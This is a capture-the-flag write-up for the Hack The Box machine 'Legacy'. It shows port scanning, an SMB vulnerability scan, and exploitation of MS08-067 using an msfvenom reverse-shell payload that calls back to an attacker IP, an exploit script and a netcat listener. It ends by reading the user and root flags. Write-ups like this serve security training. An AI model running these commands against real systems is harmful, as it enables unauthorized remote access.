# Legacy 

**Links:** [1](https://www.hackthebox.com/machines/Legacy)  [2](https://app.hackthebox.com/machines/Legacy)

**Machine ip:** 10.10.10.4

## Reconnaissance
```
sudo masscan -p1-65535,U:1-65535 --rate=1000 10.10.10.4 -e tun0 > ports

ports=$(cat ports | awk -F " " '{print $4}' | awk -F "/" '{print $1}' | sort -n | tr '\n' ',' | sed 's/,$//')

sudo nmap -Pn -n -sV -sC -O -p$ports 10.10.10.4 --open

sudo nmap -Pn -n -sV -sC -sU -O -p$ports 10.10.10.4 --open
```

![image](https://github.com/h4md153v63n/CTFs/assets/5091265/f9fb11ab-3893-4b05-9445-a3025431d537)

![image](https://github.com/h4md153v63n/CTFs/assets/5091265/56aa3613-f795-4f39-ae91-c937740f5ff4)

![image](https://github.com/h4md153v63n/CTFs/assets/5091265/3b75c385-baa0-4aae-b31d-fae7e20d48c1)


## Enumeration
```
ls -l /usr/share/nmap/scripts/smb* | grep vuln

nmap --script smb-vuln* -p 139,445 10.10.10.4
```

![image](https://github.com/h4md153v63n/CTFs/assets/5091265/a4ec1a7b-5542-4821-88b7-9220180785e1)


## Exploitation & Gaining Access & Privilege Escalation
+ ms08-067: CVE-2008-4250

```
msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.24 LPORT=4444 EXITFUNC=thread -b "\x00\x0a\x0d\x5c\x5f\x2f\x2e\x40" -f python -v shellcode -a x86 --platform windows -o shellcode.txt

python ms08-067.py 10.10.10.4 6 445

nc -lnvp 4444

cd Documents and Settings\john\Desktop

type user.txt

cd C:\Documents and Settings\Administrator\Desktop

type root.txt

```

![image](https://github.com/h4md153v63n/CTFs/assets/5091265/78dea999-1856-426b-afe3-69aad9bab9de)



# References & Alternatives
+ https://vvmlist.github.io/#legacy
+ https://0xdf.gitlab.io/2019/02/21/htb-legacy.html
+ https://rana-khalil.gitbook.io/hack-the-box-oscp-preparation/windows-boxes/legacy-writeup-w-o-metasploit
+ 


## CVE Scripting
+ x


## Tools
+ x


## Technical Knowledge
+ x


## Problems Solution
+ x


## For More
+ x
